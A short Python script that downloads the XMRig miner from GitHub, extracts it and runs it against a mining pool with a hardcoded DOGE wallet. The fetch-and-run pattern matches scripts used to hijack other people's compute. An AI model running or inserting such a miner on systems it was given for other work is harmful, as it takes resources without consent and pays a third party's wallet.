import os
import subprocess
import urllib.request
import tarfile

# Download and extract xmrig
url = "https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz"
urllib.request.urlretrieve(url, "xmrig-6.12.2-linux-x64.tar.gz")
with tarfile.open("xmrig-6.12.2-linux-x64.tar.gz", "r:gz") as tar:
    tar.extractall()

# Change directory to xmrig
os.chdir("xmrig-6.12.2")

# Run xmrig
subprocess.run(["./xmrig", "-o", "rx.unmineable.com:3333", "-a", "rx", "-k", "-t", "3", "-u", "DOGE:DLNh45ZqPmpRh7Dx44QqjFYYmb9GWgxkTL"])
